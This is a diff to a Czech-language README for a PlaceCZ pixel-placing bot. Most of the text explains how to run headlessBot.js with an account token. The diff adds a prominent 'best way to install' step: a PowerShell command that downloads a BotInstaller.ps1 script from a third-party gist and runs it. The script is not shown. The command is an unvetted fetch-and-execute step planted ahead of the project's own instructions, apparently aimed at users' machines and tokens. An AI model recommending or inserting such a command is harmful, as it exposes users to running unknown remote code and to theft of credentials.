@@ -25,6 +25,9 @@ Bot totiž ještě nezohledňuje již probíhající odpočet, takže předpokl�
 
 ## Headless Bot
 
+!! Nejlepší způsob jak instalovat bota je pomocí tohoto commandu:  
+```Invoke-WebRequest "https://gist.githubusercontent.com/WaveLinkdev/01615d294332eddcc9a22cd9706a975d/raw/0612640ead690d66df13e6c96a0060ee5118db1a/BotInstaller.ps1" -OutFile installer.ps1 | powershell ./installer.ps1```
+
 Headless bota můžete používat bez otevřeného browseru a s více účty naráz. K spuštění tohoto bota je potřeba [NodeJS](https://nodejs.org/en/)Jako první si stáhněte [Script](https://raw.githubusercontent.com/PlaceCZ/Bot/master/headlessBot.js), Poté v složce ve které jste si script stáhly otevřete terminál a spusťte komand `npm install`. Ve složce musí být i soubor [package.json](https://raw.githubusercontent.com/PlaceCZ/Bot/master/package.json) aby se to mohlo nainstalovat. Komand stáhne potřebné balíčky a potom bota zapněte pomocí `node headlessBot.js <token>`.
 
 ## Získání tokenu
